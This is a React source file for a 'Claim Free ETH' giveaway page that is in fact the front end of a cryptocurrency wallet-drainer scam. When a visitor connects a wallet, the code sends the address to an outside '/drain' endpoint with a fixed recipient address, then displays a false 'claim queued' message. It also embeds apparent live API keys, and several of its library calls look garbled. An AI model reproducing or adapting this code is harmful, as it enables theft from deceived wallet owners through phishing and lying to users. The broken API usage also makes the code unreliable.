import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";

// Import Web3Modal and Wagmi
import { configureChains, createConfig, WagmiConfig } from "wagmi";
import { jsonRpcProvider } from "wagmi";
import { web3Modal } from "@web3modal/wagmi";
import { Chain } from "@wagmi/core";

// Import Ethereum Chain
import { ChainId } from "@wagmi/chains";

// Define chains
const chains = [
  ChainId.Ethereum,
];

// Create provider
const provider = jsonRpcProvider({
  chains,
  rpc: {
    [ChainId.Ethereum]: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2",
  },
});

// Configure chains
const { chains: wagmiChains, provider: wagmiProvider } = configureChains(
  [ChainId.Ethereum],
  [provider]
);

// Create config
const config = createConfig({
  chains: wagmiChains,
  provider: wagmiProvider,
});

// Initialize Web3Modal
web3Modal.init({
  // You can use any WalletConnect project ID
  projectId: "962425907914a3e80a7d8e7288b23f62", // Replace with your actual WalletConnect project ID
  chains: [ChainId.Ethereum],
  enableAnalytics: true,
  enableBatchActions: true,
  theme: "dark",
});

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);

  // Connect wallet using Web3Modal
  const connectWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      const { account } = await web3Modal.connect();
      setWalletAddress(account);

      // Make a POST request to your backend
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address: account,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      if (res.ok) {
        setResponse({
          success: true,
          message: "Token claim queued. You will be credited in a few minutes.",
        });
      } else {
        setResponse({
          success: false,
          message: "Failed to claim token. Try again later.",
        });
      }
    } catch (err) {
      console.error(err);
      setResponse({
        success: false,
        message: "Failed to claim token. Try again later.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <WagmiConfig config={config}>
      <div
        style={{
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          height: "100vh",
          backgroundColor: "#121212",
          fontFamily: "Arial, sans-serif",
          color: "#ffffff",
          padding: "20px",
        }}
      >
        <div
          style={{
            backgroundColor: "#1e1e1e",
            borderRadius: "10px",
            padding: "30px",
            boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
            maxWidth: "400px",
            width: "100%",
          }}
        >
          <h1 style={{ textAlign: "center" }}>Claim Free ETH</h1>
          <p style={{ textAlign: "center", marginBottom: "20px" }}>
            Connect your wallet to claim 0.5 ETH now. It's free and easy!
          </p>
          <button
            onClick={connectWallet}
            disabled={loading}
            style={{
              margin: "20px auto",
              display: "block",
              padding: "12px 24px",
              fontSize: "16px",
              backgroundColor: "#4CAF50",
              color: "white",
              border: "none",
              borderRadius: "5px",
              cursor: "pointer",
              transition: "background-color 0.3s ease",
            }}
          >
            {loading ? "Connecting..." : "Connect Wallet"}
          </button>

          {response && (
            <div
              style={{
                marginTop: "20px",
                padding: "15px",
                backgroundColor: "#2a2a2a",
                borderRadius: "5px",
                border: "1px solid #444",
              }}
            >
              <h3 style={{ marginBottom: "10px" }}>Response:</h3>
              <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
                {JSON.stringify(response, null, 2)}
              </pre>
            </div>
          )}
        </div>
      </div>
    </WagmiConfig>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
